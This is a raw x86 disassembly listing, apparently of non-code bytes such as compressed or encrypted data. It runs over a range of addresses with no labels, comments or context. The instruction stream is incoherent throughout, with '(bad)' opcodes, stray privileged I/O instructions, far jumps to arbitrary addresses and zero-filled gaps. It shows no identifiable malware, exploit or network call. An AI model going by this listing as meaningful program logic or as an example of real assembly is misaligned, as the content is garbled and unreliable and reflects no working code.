  441b4e:	add    BYTE PTR [edi-0xebd82ca],ah
	...
  441b70:	add    BYTE PTR [eax],al
  441b72:	setb   BYTE PTR [ebx+ebp*8+0x8]
  441b77:	mov    ch,0xdd
  441b79:	jb     0x441bca
  441b7b:	cmp    al,0x2d
  441b7d:	sub    ch,BYTE PTR [edx]
  441b7f:	inc    edx
  441b80:	push   esp
  441b81:	bound  ebx,QWORD PTR [edi]
  441b83:	or     al,0x87
  441b85:	scas   eax,DWORD PTR es:[edi]
  441b86:	push   ss
  441b87:	stc    
  441b88:	mov    al,0xe5
  441b8a:	push   ecx
  441b8b:	in     eax,0xd5
  441b8d:	bound  eax,QWORD PTR [edi]
  441b8f:	inc    eax
  441b90:	bound  esp,QWORD PTR [eax+0x5]
  441b93:	or     DWORD PTR cs:[esi+0x2f855444],ebx
  441b9a:	jmp    0x37716e1b
  441b9f:	jg     0x441ba5
  441ba1:	and    edi,DWORD PTR [esi+0x9826039]
  441ba7:	add    BYTE PTR [eax],al
  441ba9:	jmp    0x6b2bac93
  441bae:	push   cs
  441baf:	add    BYTE PTR [eax],al
  441bb1:	call   0x3fc96f7a
  441bb6:	add    ebp,eax
  441bb8:	push   ebx
  441bb9:	or     eax,0xae5839ea
  441bbe:	aam    0x5f
  441bc0:	add    cl,ch
  441bc2:	push   cs
  441bc3:	add    BYTE PTR [ecx],cl
  441bc5:	aas    
  441bc6:	or     BYTE PTR [edi+0x42],bh
  441bc9:	xor    DWORD PTR [edx+0x3f09df],eax
  441bcf:	(bad)  
  441bd0:	cs test al,0xf3
  441bd3:	inc    ecx
  441bd4:	push   esp
  441bd5:	jo     0x441bd7
	...
  441bf3:	add    ah,al
  441bf5:	aaa    
  441bf6:	in     eax,0xbc
  441bf8:	stos   DWORD PTR es:[edi],eax
  441bf9:	xor    DWORD PTR [edx+eiz*2-0x2c],ebp
  441bfd:	pop    es
  441bfe:	xchg   ch,ah
  441c00:	adc    BYTE PTR [ebp-0x76],bh
  441c03:	add    BYTE PTR [eax+ecx*8+0x477ffff9],al
  441c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441c0b:	push   ss
  441c0c:	hlt    
  441c0d:	add    DWORD PTR [ebx],ebp
  441c0f:	call   edx
  441c11:	inc    esp
  441c12:	cmp    al,0x4a
  441c14:	jg     0x441c5d
  441c16:	mov    al,ds:0x8301f416
  441c1b:	mov    ds,WORD PTR [edi+eax*8-0x7]
  441c1f:	jmp    FWORD PTR [ebp+edi*8+0x8]
  441c23:	add    DWORD PTR [edx-0x5f],ebp
  441c26:	push   cs
  441c27:	add    BYTE PTR [edx+eax*1-0x36d3f52],dh
  441c2e:	fwait
  441c2f:	xchg   BYTE PTR [eax+0x1],ah
  441c32:	add    BYTE PTR [eax],al
  441c34:	aas    
  441c35:	sbb    BYTE PTR [esi+edx*1-0x7b7afe4c],0x32
  441c3d:	dec    eax
  441c3e:	add    BYTE PTR [eax],al
  441c40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441c41:	in     al,dx
  441c42:	leave  
  441c43:	sub    ebx,DWORD PTR [edi-0x7]
  441c46:	test   DWORD PTR [eax+0xf000162],esp
  441c4c:	loopne 0x441c0b
  441c4e:	test   DWORD PTR [esi+0x40],0xca01f243
  441c55:	pop    edi
  441c56:	jge    0x441c57
	...
  441c74:	add    BYTE PTR [eax],al
  441c76:	jnp    0x441cf5
  441c78:	(bad)  
  441c79:	std    
  441c7a:	jnp    0x441c2b
  441c7c:	or     DWORD PTR [esi+0x28],0x7d
  441c80:	sar    DWORD PTR [eax+0x63],0x44
  441c84:	cmp    BYTE PTR ds:[edi],dh
  441c87:	ret    0x2e3
  441c8a:	xchg   ecx,eax
  441c8c:	adc    DWORD PTR [esi+0x38],0x23
  441c90:	add    BYTE PTR [ebx],ch
  441c92:	cmc    
  441c93:	or     eax,0xeebc5650
  441c98:	sub    eax,0x7cd70d00
  441c9d:	inc    edx
  441c9e:	test   eax,0x497d0e61
  441ca3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441ca4:	jbe    0x441ce8
  441ca6:	imul   ebp,DWORD PTR [edi],0xe02f86f
  441cac:	jnp    0x441cb8
  441cae:	mov    cs,WORD PTR [edi+0x5403ffed]
  441cb4:	jae    0x441cb1
  441cb6:	jmp    0x2b17:0x1e5a2ee5
  441cbd:	pop    ebx
  441cbe:	into   
  441cbf:	popa   
  441cc0:	inc    esi
  441cc1:	ins    BYTE PTR es:[edi],dx
  441cc2:	xchg   BYTE PTR [esi],cl
  441cc4:	cmp    eax,0xf
  441cc7:	dec    ecx
  441cc8:	add    dh,BYTE PTR [edi-0x228f1]
  441cce:	mov    ss,WORD PTR [ebx-0x7]
  441cd1:	add    eax,DWORD PTR [esp+ecx*2-0x28f2ed6f]
  441cd8:	push   edx
  441cd9:	cmp    eax,DWORD PTR [eax]
	...
  441cf7:	add    BYTE PTR [esi-0x407ccffc],dl
  441cfd:	cs pop es
  441cff:	test   DWORD PTR [ebx-0x1],eax
  441d02:	add    al,dh
  441d04:	jbe    0x441cde
  441d06:	adc    al,0xc7
  441d08:	fiadd  WORD PTR [ecx]
  441d0a:	ret    0xdc50
  441d0d:	in     al,dx
  441d0e:	fnclex 
  441d10:	cmp    bh,dl
  441d12:	std    
  441d13:	test   bl,al
  441d15:	bnd jp 0x441d52
  441d18:	mov    ss,WORD PTR [edx+0x12c386ed]
  441d1e:	fadd   QWORD PTR [edx+0x55]
  441d21:	jge    0x441cf3
  441d23:	test   DWORD PTR [ebx],edx
  441d25:	mov    dh,BYTE PTR [esi+0x30a6d537]
  441d2b:	or     DWORD PTR [eax-0x7faad069],esp
  441d31:	jmp    DWORD PTR [edi+0x66c0c605]
  441d37:	xchg   ecx,eax
  441d38:	ins    DWORD PTR es:[edi],dx
  441d39:	in     eax,dx
  441d3a:	out    0x3,al
  441d3c:	or     eax,0xbf7d0f4c
  441d41:	and    ebp,DWORD PTR [ebp+esi*4-0x7b]
  441d45:	sti    
  441d46:	ins    DWORD PTR es:[edi],dx
  441d47:	inc    ecx
  441d48:	inc    ebp
  441d49:	call   FWORD PTR [esp+ebx*8]
  441d4c:	sti    
  441d4d:	push   cs
  441d4e:	and    BYTE PTR [ebp+0xd],bl
  441d51:	pop    ss
  441d52:	and    eax,0xf2a5a33
  441d57:	jo     0x441d77
  441d59:	add    bh,ah
  441d5b:	jl     0x441d5d
	...
  441d79:	add    BYTE PTR [edi],bh
  441d7b:	push   esp
  441d7c:	pop    esi
  441d7d:	adc    DWORD PTR [eax-0x44],edx
  441d80:	xlat   BYTE PTR ds:[ebx]
  441d81:	jp     0x441de2
  441d83:	and    al,0xf
  441d85:	sar    BYTE PTR [ebx+eax*8+0x7f0f7bf2],1
  441d8c:	outs   dx,DWORD PTR ds:[esi]
  441d8d:	repz mov dl,0xf2
  441d90:	push   0x64
  441d92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441d93:	ret    
  441d94:	fisubr DWORD PTR [edi]
  441d96:	inc    edi
  441d97:	ja     0x441d3f
  441d99:	sub    esi,DWORD PTR [esi]
  441d9b:	mov    edi,0xb4c1c09b
  441da0:	mov    bl,0xc0
  441da2:	pop    ecx
  441da3:	mov    ah,0xab
  441da5:	rcl    BYTE PTR [ecx-0x4c],0x1c
  441da9:	jnp    0x441e14
  441dab:	das    
  441dac:	adc    DWORD PTR [ebx-0x2],edi
  441daf:	idiv   DWORD PTR [ecx]
  441db1:	mov    ebp,DWORD PTR [edx-0x3d]
  441db4:	out    0x3,eax
  441db6:	mov    bl,al
  441db8:	pop    esi
  441db9:	ds loope 0x441d3c
  441dbc:	nop
  441dbd:	push   es
  441dbe:	push   edx
  441dbf:	ret    
  441dc0:	out    0x52,eax
  441dc2:	icebp  
  441dc3:	jbe    0x441e3e
  441dc5:	fsubr  st(7),st
  441dc7:	enter  0x7600,0x4a
  441dcb:	jge    0x441e17
  441dcd:	cmc    
  441dce:	mov    ebx,ecx
  441dd0:	add    ch,al
  441dd2:	push   cs
  441dd3:	add    BYTE PTR [ebp-0xd],ch
  441dd6:	pop    DWORD PTR [edi+0xc]
  441dd9:	jmp    0xeb709cf9
	...
  441dfa:	add    BYTE PTR [eax],al
  441dfc:	push   cs
  441dfd:	add    BYTE PTR [ebx-0x2d80f5d0],al
  441e03:	jmp    0x441e13
  441e05:	add    BYTE PTR ds:0xfdca8e29,ch
  441e0b:	mov    edx,0xb1427d31
  441e10:	addr16 ss pop eax
  441e13:	jb     0x441e30
  441e15:	push   esp
  441e16:	test   DWORD PTR [edi+0x62e0b502],edx
  441e1c:	adc    ecx,DWORD PTR [eax]
  441e1e:	or     DWORD PTR [edi],edi
  441e20:	dec    ebp
  441e21:	repz std 
  441e23:	mov    ecx,0x9d41e4c9
  441e28:	aaa    
  441e29:	ss inc esp
  441e2b:	retf   0x7cc4
  441e2e:	push   edx
  441e2f:	sub    DWORD PTR [eax],ebp
  441e31:	ds dec eax
  441e33:	inc    edi
  441e34:	es cld 
  441e36:	ds dec edi
  441e38:	sbb    ah,bh
  441e3a:	jne    0x441e9e
  441e3c:	rcl    BYTE PTR [ebx+0x1d],1
  441e3f:	aaa    
  441e40:	and    eax,0x8229527d
  441e45:	pop    DWORD PTR [ebx+eiz*1]
  441e48:	div    BYTE PTR ds:0x3c386248
  441e4e:	bound  esi,QWORD PTR [edx-0x28]
  441e51:	push   ebx
  441e52:	bound  esi,QWORD PTR [eax+0x12]
  441e55:	cmp    al,BYTE PTR [ebp+0x527cf127]
  441e5b:	sbb    DWORD PTR [edx+0xf9c1],eax
	...
  441e7d:	add    BYTE PTR [esi+edi*8],dh
  441e80:	or     BYTE PTR [esi+0xc],0x45
  441e84:	dec    esi
  441e85:	lods   eax,DWORD PTR fs:[esi]
  441e87:	xor    al,0x60
  441e89:	test   DWORD PTR [edx+ebp*1+0x42],esp
  441e8d:	cmp    esp,DWORD PTR [edx+0x3400007e]
  441e93:	sub    eax,0x225a8b3a
  441e98:	or     DWORD PTR [esi+0x10],0xffffffe5
  441e9c:	iret   
  441e9d:	sbb    DWORD PTR [ebp-0x5],0xf6f4fff8
  441ea4:	enter  0xf477,0xd
  441ea8:	dec    esi
  441ea9:	call   0x44134a
  441eae:	ja     0x441e69
  441eb0:	or     BYTE PTR [ecx-0x784a256],cl
  441eb6:	jmp    0x627d34e5
  441ebb:	inc    ebp
  441ebc:	add    BYTE PTR [eax],al
  441ebe:	mov    ah,0x29
  441ec0:	or     eax,DWORD PTR [ebx+0x116cfe0c]
  441ec6:	das    
  441ec7:	or     ebp,DWORD PTR [ebx+ebp*1-0x66]
  441ecb:	sub    eax,0xcdb4fa79
  441ed0:	stc    
  441ed1:	(bad)  
  441ed2:	cmp    bh,bh
  441ed4:	cmp    BYTE PTR [esi+0x44],0x47
  441ed8:	ds js  0x441f02
  441edb:	mov    ah,0xfb
  441edd:	push   cs
  441ede:	mul    BYTE PTR [eax]
  441ee0:	stc    
  441ee1:	inc    DWORD PTR [eax]
	...
  441eff:	add    BYTE PTR [esi+esi*8+0x3d],dh
  441f03:	pusha  
  441f04:	jae    0x441f82
  441f06:	add    DWORD PTR fs:[ebp+edi*8+0x5d],esp
  441f0b:	mov    ebp,DWORD PTR [edx]
  441f0d:	pusha  
  441f0e:	pop    esi
  441f0f:	sub    ebx,DWORD PTR [edx]
  441f11:	pop    eax
  441f12:	add    DWORD PTR [esi+0xd],0xfffffffb
  441f16:	jbe    0x441f62
  441f18:	fprem  
  441f1a:	push   ss
  441f1b:	int    0x96
  441f1d:	pop    ecx
  441f1e:	test   al,0x12
  441f20:	or     eax,0x57c7ad7
  441f25:	dec    esp
  441f26:	jbe    0x441f6a
  441f28:	mov    ch,0xa1
  441f2a:	xchg   esp,eax
  441f2b:	(bad)  
  441f2c:	xchg   esi,eax
  441f2d:	inc    ecx
  441f2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441f2f:	adc    cl,BYTE PTR ds:0x98763d7
  441f35:	xchg   BYTE PTR [eax-0x66],bh
  441f38:	ins    DWORD PTR es:[edi],dx
  441f39:	leave  
  441f3a:	std    
  441f3b:	call   DWORD PTR [esi+0xd126c20]
  441f41:	xlat   BYTE PTR ds:[ebx]
  441f42:	sbb    ebp,edi
  441f44:	xchg   edx,eax
  441f45:	shl    bh,cl
  441f47:	or     BYTE PTR [ebx-0x150078ea],bh
  441f4d:	(bad)  
  441f4e:	std    
  441f4f:	inc    BYTE PTR [eax-0x25000dca]
  441f55:	fst    DWORD PTR [ebx+0x3d9cdd90]
  441f5b:	add    BYTE PTR [ebx],dh
  441f5d:	fsubr  DWORD PTR [ecx-0x6e]
  441f60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441f61:	(bad)  
  441f63:	inc    DWORD PTR [eax]
	...
  441f81:	add    BYTE PTR [eax+0x9987252],cl
  441f87:	xlat   BYTE PTR ds:[ebx]
  441f88:	std    
  441f89:	jle    0x441f57
  441f8b:	fxch   st(4)
  441f8d:	add    BYTE PTR ds:0x9afefd9f,cl
  441f93:	(bad)  
  441f94:	arpl   WORD PTR ds:0x90025c5,si
  441f9a:	ret    0xfc8f
  441f9d:	mov    cl,0x8c
  441f9f:	xchg   BYTE PTR ds:0xfabe0d40,dh
  441fa5:	or     BYTE PTR [edx+0x12e6be67],bh
  441fab:	add    dl,dh
  441fad:	xchg   ebp,eax
  441fae:	jecxz  0x441f7f
  441fb0:	xor    BYTE PTR [ebp+ecx*1+0x5a],al
  441fb4:	call   0xe0bbaf28
  441fb9:	add    ecx,DWORD PTR ds:0x1f6f6975
  441fbf:	add    bh,ah
  441fc1:	sbb    BYTE PTR [eax+0xc],bh
  441fc4:	mov    al,ds:0xd19f8f0a
  441fc9:	add    ecx,DWORD PTR ds:0x144ba975
  441fcf:	ins    BYTE PTR es:[edi],dx
  441fd0:	sub    BYTE PTR [eax+0x48],bh
  441fd3:	adc    al,0x37
  441fd5:	add    bh,BYTE PTR [edi+0x7c3664b]
  441fdb:	mov    ch,BYTE PTR [ecx-0x10b275b5]
  441fe1:	jle    0x442035
  441fe3:	add    al,ch
  441fe5:	sub    eax,0x0
	...
  442002:	add    BYTE PTR [eax],al
  442004:	popa   
  442005:	mov    edx,DWORD PTR [ecx-0x6528dfa1]
  44200b:	or     eax,0x78af4688
  442010:	inc    edi
  442011:	pop    eax
  442012:	pop    esi
  442013:	sub    eax,0x7807d319
  442018:	push   edi
  442019:	clc    
  44201a:	icebp  
  44201b:	xchg   ebp,eax
  44201c:	push   ecx
  44201d:	adc    ebp,esp
  44201f:	adc    BYTE PTR [edx-0x1d],bh
  442022:	test   al,0x37
  442024:	mov    BYTE PTR [esi-0x5d],cl
  442027:	jp     0x442078
  442029:	dec    eax
  44202a:	repnz xchg edx,eax
  44202c:	or     DWORD PTR [ecx+0x6],eax
  44202f:	scas   al,BYTE PTR es:[edi]
  442030:	nop
  442031:	push   esi
  442032:	daa    
  442033:	bound  ecx,QWORD PTR [edx-0x4204d2fc]
  442039:	inc    esi
  44203a:	push   ebx
  44203b:	jg     0x442014
  44203d:	inc    edi
  44203e:	outs   dx,BYTE PTR ds:[esi]
  44203f:	xor    dl,cl
  442041:	and    eax,0x460d6000
  442046:	mov    ch,0xe8
  442048:	push   cs
  442049:	add    BYTE PTR [eax],al
  44204b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44204c:	daa    
  44204d:	cmp    BYTE PTR [ebx+0x5a],dh
  442050:	adc    BYTE PTR [edx+0x6c],bl
  442053:	push   0xffffffc4
  442055:	pop    es
  442056:	add    BYTE PTR [edx-0x31],ah
  442059:	sub    eax,ecx
  44205b:	das    
  44205c:	loope  0x44205d
  44205e:	(bad)  
  44205f:	call   0x986e172
  442064:	or     eax,DWORD PTR [eax]
  442066:	add    cl,ch
	...
  442084:	add    BYTE PTR [eax],al
  442086:	daa    
  442087:	and    ebx,0x64
  44208a:	push   esi
  44208b:	mov    ecx,0x82f2b785
  442090:	into   
  442091:	ror    DWORD PTR [edi],1
  442093:	test   DWORD PTR [edx+0x11],ecx
  442096:	adc    al,dh
  442098:	in     eax,0xeb
  44209a:	sbb    eax,edi
  44209c:	jmpw   0x9ebb
  4420a0:	push   eax
  4420a1:	cwde   
  4420a2:	cmp    al,0xa8
  4420a4:	daa    
  4420a5:	cli    
  4420a6:	push   cs
  4420a7:	add    BYTE PTR [ebp+0x3a853ab7],al
  4420ad:	push   0xffffffcd
  4420af:	ja     0x87ec4b5c
  4420b5:	adc    al,0xd6
  4420b7:	mov    eax,0x358bdf85
  4420bc:	adc    cl,ch
  4420be:	mov    bh,0x81
  4420c0:	stos   DWORD PTR es:[edi],eax
  4420c1:	hlt    
  4420c2:	(bad)  
  4420c3:	mov    eax,0xc0038f59
  4420c8:	push   ebp
  4420c9:	inc    esp
  4420ca:	retf   0x7a3c
  4420cd:	push   ecx
  4420ce:	adc    DWORD PTR [ecx],ecx
  4420d0:	test   BYTE PTR [edx+0xe],bh
  4420d3:	add    BYTE PTR [eax],al
  4420d5:	(bad)  
  4420d6:	int3   
  4420d7:	sub    eax,DWORD PTR [ebp-0x7df3c600]
  4420dd:	inc    esp
  4420de:	jl     0x4420a9
  4420e0:	adc    DWORD PTR [esi-0x64f7c],0xffffffef
  4420e7:	cmp    BYTE PTR [esi+edx*1+0x0],ah
	...
  442106:	add    BYTE PTR [eax],al
  442108:	je     0x44210c
  44210a:	sub    edi,edi
  44210c:	adc    bh,BYTE PTR ds:0x30ef513c
  442112:	cwde   
  442113:	push   ss
  442114:	xor    al,0x2
  442116:	or     DWORD PTR [esi-0x64f2c],0xffffffbc
  44211d:	mov    esi,0x62da0103
  442122:	push   cs
  442123:	add    BYTE PTR [ecx+edi*4],dh
  442126:	scas   eax,DWORD PTR es:[edi]
  442127:	rcl    BYTE PTR [edx+0x3],1
  44212a:	pushf  
  44212b:	xchg   esi,eax
  44212c:	mov    al,ds:0xa9000002
  442131:	mov    ss,WORD PTR ds:[esp+esi*8+0x728b0001]
  442139:	and    eax,0x1ee4000e
  44213e:	mov    ebx,0xe616239
  442143:	add    ah,dh
  442145:	push   eax
  442146:	daa    
  442147:	mov    ebx,DWORD PTR [edx-0x5336831b]
  44214d:	add    al,BYTE PTR [ebx-0x46f943ba]
  442153:	jmp    0x44210b
  442155:	push   ss
  442156:	ror    BYTE PTR [ebx+0x6255a2],0xdf
  44215d:	je     0x4421a9
  44215f:	push   eax
  442160:	xchg   edx,eax
  442161:	fld    DWORD PTR [edx-0x7cfe4bce]
  442167:	inc    esi
  442168:	cmp    BYTE PTR [ebx],bh
  44216a:	add    DWORD PTR ss:[eax],0x0
	...
  44218a:	jo     0x442140
  44218c:	add    BYTE PTR [esi+0xd],0xf3
  442190:	(bad)  
  442192:	or     esi,0xa81385c7
  442198:	daa    
  442199:	ins    BYTE PTR es:[edi],dx
  44219a:	jp     0x442189
  44219c:	dec    edi
  44219d:	jge    0x442193
  44219f:	(bad)  
  4421a0:	std    
  4421a1:	out    0xc3,al
  4421a3:	ins    DWORD PTR es:[edi],dx
  4421a4:	(bad)  
  4421a5:	stc    
  4421a6:	or     al,0x45
  4421a8:	pop    eax
  4421a9:	stc    
  4421aa:	retf   
  4421ab:	adc    dh,BYTE PTR [ebp+0x5a]
  4421ae:	in     eax,0x7f
  4421b0:	retf   
  4421b1:	cld    
  4421b2:	dec    edx
  4421b3:	mov    es,WORD PTR [ebx+0x49a6b57a]
  4421b9:	inc    edx
  4421ba:	xchg   BYTE PTR ds:0x6ecb8558,dl
  4421c0:	jnp    0x442206
  4421c2:	ucomiss xmm7,DWORD PTR [ebx-0x76]
  4421c6:	ins    DWORD PTR es:[edi],dx
  4421c7:	mov    ebp,0x3586fffd
  4421cc:	mov    al,ds:0x14a70d12
  4421d1:	stc    
  4421d2:	jae    0x4421f4
  4421d4:	or     BYTE PTR [esi-0x6a],al
  4421d7:	pop    esp
  4421d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4421d9:	adc    cl,BYTE PTR ds:0x958a7ca7
  4421df:	fdiv   st(5),st
  4421e1:	call   DWORD PTR [ebp-0x7f01115e]
  4421e7:	inc    esi
  4421e8:	out    dx,al
  4421e9:	(bad)  
  4421ea:	fisubr DWORD PTR [ebp+0xc08f]
	...
  44220c:	imul   ebp,DWORD PTR [eax-0x595e7d9f],0xfffffffd
  442213:	call   DWORD PTR [eax+0xd947e2a]
  442219:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44221a:	std    
  44221b:	xchg   BYTE PTR [ebx],dh
  44221d:	jg     0x44229b
  44221f:	inc    edx
  442220:	cmp    DWORD PTR [edx],esp
  442222:	mov    esp,0xe4ffa57d
  442227:	push   ebp
  442228:	push   cs
  442229:	ja     0x442210
  44222b:	add    ecx,DWORD PTR ds:0x19466600
  442231:	add    al,0x60
  442233:	jns    0x4421ee
  442235:	adc    eax,0xfafe03e7
  44223a:	ins    DWORD PTR es:[edi],dx
  44223b:	xor    ecx,edx
  44223d:	adc    BYTE PTR [ebp+0x19890c4b],0xc
  442244:	pusha  
  442245:	(bad)  
  442246:	mov    es,WORD PTR ds:0x1d36c728
  44224c:	xchg   ebx,eax
  44224d:	dec    edi
  44224e:	cmp    BYTE PTR [edx],dh
  442250:	xor    eax,0xd03d8d6
  442255:	mov    DWORD PTR [ecx],esi
  442257:	pop    eax
  442258:	nop
  442259:	std    
  44225a:	gs mov edi,0x2821871d
  442260:	xor    eax,0x24c872f6
  442265:	mov    cl,bh
  442267:	adc    al,0x4d
  442269:	mul    BYTE PTR [ebx+esi*8-0x3c83f34b]
	...
  44228c:	add    BYTE PTR [eax],al
  44228e:	addr16 push edi
  442290:	retw   
  442292:	add    ebx,DWORD PTR [ebp+0x26]
  442295:	test   BYTE PTR [edi+0xd03d160],dh
  44229b:	add    BYTE PTR [ebx-0x74ad6ff5],bh
  4422a1:	jle    0x442276
  4422a3:	cmp    dl,ch
  4422a5:	jl     0x4422ee
  4422a7:	clc    
  4422a8:	in     eax,0xbd
  4422aa:	call   0x33fef8ad
  4422af:	add    BYTE PTR [esi-0x66aea23b],bh
  4422b5:	fisttp DWORD PTR [ebx-0x77fc190f]
  4422bb:	inc    edx
  4422bc:	add    BYTE PTR [ebp+0x257cf629],al
  4422c2:	sahf   
  4422c3:	add    BYTE PTR [edx+0x45],0xb9
  4422c7:	stos   BYTE PTR es:[edi],al
  4422c8:	in     eax,dx
  4422c9:	fmulp  st(2),st
  4422cb:	test   DWORD PTR [edx],ecx
  4422cd:	push   0xffffffd8
  4422cf:	ltr    si
  4422d2:	add    ah,BYTE PTR [ebx]
  4422d4:	cli    
  4422d5:	(bad)  
  4422d6:	push   edx
  4422d7:	pop    ecx
  4422d8:	pop    edx
  4422d9:	jb     0x442329
  4422db:	push   ebp
  4422dc:	pop    ebx
  4422dd:	stos   BYTE PTR es:[edi],al
  4422de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4422df:	int3   
  4422e0:	int3   
  4422e1:	popf   
  4422e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4422e3:	int3   
  4422e4:	int3   
  4422e5:	mov    ch,0x95
  4422e7:	int3   
  4422e8:	int3   
  4422e9:	lods   eax,DWORD PTR ds:[esi]
  4422ea:	xchg   ebp,eax
  4422eb:	int3   
  4422ec:	int3   
  4422ed:	cmp    al,0xc6
  4422ef:	stos   DWORD PTR es:[edi],eax
  4422f0:	test   DWORD PTR [eax+eax*1],ebx
	...
  44230f:	add    BYTE PTR [ecx+0x51],al
  442312:	sub    eax,0x74c6067f
  442317:	or     esi,DWORD PTR [esi+0x68b21bfa]
  44231d:	xor    al,0x55
  44231f:	pusha  
  442320:	mov    ecx,0x2ad8871b
  442325:	sub    BYTE PTR [edi-0xf],0x91
  442329:	sub    bl,BYTE PTR [eax]
  44232b:	bound  eax,QWORD PTR [ecx+0x8]
  44232e:	xor    eax,0x7cfe5d37
  442333:	dec    ebx
  442334:	adc    BYTE PTR [ebx-0x778a06b1],al
  44233a:	xor    ah,ch
  44233c:	push   cs
  44233d:	add    BYTE PTR [edi+0x43061f9],al
  442343:	jo     0x442386
  442345:	or     al,0x87
  442347:	cdq    
  442348:	xor    DWORD PTR cs:[eax-0x2f],0x49
  44234d:	xor    BYTE PTR [esi+eiz*1],bh
  442350:	dec    ecx
  442351:	adc    al,0x0
  442353:	add    BYTE PTR [esp+eax*1],ah
  442356:	add    BYTE PTR [ecx+0x4881527c],cl
  44235c:	test   BYTE PTR [ebx],bh
  44235e:	dec    eax
  44235f:	dec    esp
  442360:	jmp    0x4422e5
  442362:	rcr    BYTE PTR [ebx],0xa4
  442365:	(bad)  
  442366:	clc    
  442367:	jmp    DWORD PTR [esi+edi*8-0x5a477f42]
  44236e:	stc    
  44236f:	call   DWORD PTR [ebx-0x3f]
  442372:	idiv   edi
	...
  442390:	add    BYTE PTR [eax],al
  442392:	ja     0x442352
  442394:	push   esi
  442395:	pop    ebp
  442396:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442397:	mov    edx,0xc1a2b7f9
  44239c:	idiv   edi
  44239e:	adc    ch,cl
  4423a0:	mov    ecx,0xcc726404
  4423a5:	int3   
  4423a6:	mov    al,ds:0x9cccc72
  4423ab:	aaa    
  4423ac:	in     al,dx
  4423ad:	mov    esp,DWORD PTR [ecx]
  4423af:	mov    esp,0x784fd22c
  4423b4:	je     0x4423d0
  4423b6:	mov    edi,0x763b1c43
  4423bb:	dec    edx
  4423bc:	or     edx,DWORD PTR [ecx-0x53]
  4423bf:	out    dx,al
  4423c0:	daa    
  4423c1:	mov    DWORD PTR [edx+edx*1-0x7f],edx
  4423c5:	push   eax
  4423c6:	hlt    
  4423c7:	fist   DWORD PTR [esi-0x1]
  4423ca:	arpl   dx,ax
  4423cc:	push   ebp
  4423cd:	ret    0xfde8
  4423d0:	mov    bh,0xfe
  4423d2:	push   ebx
  4423d3:	ret    0x5df7
  4423d6:	es mov ecx,0x3689cbf9
  4423dc:	in     al,dx
  4423dd:	mov    eax,DWORD PTR [ecx+0x1d8550b5]
  4423e3:	dec    ecx
  4423e4:	je     0x442371
  4423e6:	lods   eax,DWORD PTR ds:[esi]
  4423e7:	mov    eax,ds:0x9b0dff7e
  4423ec:	pop    eax
  4423ed:	dec    ebp
  4423ee:	pop    ebx
  4423ef:	push   ds
  4423f0:	push   eax
  4423f1:	or     al,0x90
  4423f3:	mov    ecx,0x245
	...
  442414:	(bad)  
  442415:	(bad)  
  442417:	fidiv  DWORD PTR [esi-0x3325895f]
  44241d:	scas   al,BYTE PTR es:[edi]
  44241e:	cli    
  44241f:	cmp    al,0x8e
  442421:	mov    eax,ds:0x260e7b14
  442426:	fimul  DWORD PTR [ecx]
  442428:	nop
  442429:	fst    DWORD PTR [eax+0x12]
  44242c:	mov    cs,ecx
  44242e:	cld    
  44242f:	jnp    0x442441
  442431:	es ret 0xf309
  442435:	stos   BYTE PTR es:[edi],al
  442436:	and    edx,DWORD PTR [ebp-0x5b]
  442439:	jno    0x4423fe
  44243b:	stc    
  44243c:	bound  ecx,QWORD PTR [edx]
  44243e:	and    DWORD PTR [esi+0x4178a705],edi
  442444:	sbb    DWORD PTR [esp+eax*8],esp
  442447:	je     0x442472
  442449:	ror    BYTE PTR [esp-0x47],1
  44244d:	mov    cl,0x2d
  44244f:	test   esp,ecx
  442451:	into   
  442452:	js     0x44249b
  442454:	jmp    0x9713e76f
  442459:	in     al,0xfb
  44245b:	jl     0x4424a6
  44245d:	lahf   
  44245e:	mov    esp,0xfda6e141
  442463:	dec    DWORD PTR ds:0x15597678
  442469:	and    BYTE PTR [ebx+0x24],cl
  44246c:	cmc    
  44246d:	outs   dx,BYTE PTR ds:[esi]
  44246e:	(bad)  
  44246f:	stc    
  442470:	cli    
  442471:	pusha  
  442472:	sub    BYTE PTR [ecx+0x50],bl
  442475:	in     eax,0xfb
  442477:	inc    DWORD PTR [eax]
	...
  442495:	add    BYTE PTR [edx-0x1d063d10],ah
  44249b:	mov    DWORD PTR [edx],esp
  44249d:	mov    esi,0xb7e70005
  4424a2:	ror    ebx,0x2b
  4424a5:	mov    eax,0x78bccbd9
  4424aa:	mov    cl,0x84
  4424ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4424ad:	repz dec ecx
  4424af:	in     eax,dx
  4424b0:	sbb    eax,0x63087009
  4424b5:	or     BYTE PTR ds:0x50be700,0x33
  4424bc:	imul   eax,DWORD PTR [eax+0x4f1f1416],0x4e6e5215
  4424c6:	adc    eax,0x144fd5f5
  4424cb:	test   DWORD PTR [ecx],esp
  4424cd:	and    al,0x92
  4424cf:	pop    ecx
  4424d0:	fisttp WORD PTR [eax]
  4424d2:	mov    al,0x33
  4424d4:	in     al,0xa
  4424d6:	(bad)  
  4424d7:	jecxz  0x442514
  4424d9:	stc    
  4424da:	les    esi,FWORD PTR [edi-0x57]
  4424dd:	les    edx,FWORD PTR [eax+edi*4+0x3e]
  4424e1:	daa    
  4424e2:	xchg   ebx,eax
  4424e3:	movntq QWORD PTR [eax-0x29],mm7
  4424e7:	out    0x39,eax
  4424e9:	pop    esp
  4424ea:	push   ecx
  4424eb:	adc    al,0xe7
  4424ed:	add    esi,DWORD PTR [ebx+0x5dc517fe]
  4424f3:	test   BYTE PTR [edi-0x80],bh
  4424f6:	push   ecx
  4424f7:	or     ebp,DWORD PTR [esi+0xc8]
	...
  442515:	add    BYTE PTR [eax],al
  442517:	add    BYTE PTR [esi+0x55260a0b],bl
  44251d:	mov    ebx,0x5414c462
  442522:	mov    esp,0x5e001dc1
  442527:	adc    DWORD PTR cs:[edx+0x60],edx
  44252b:	inc    ebp
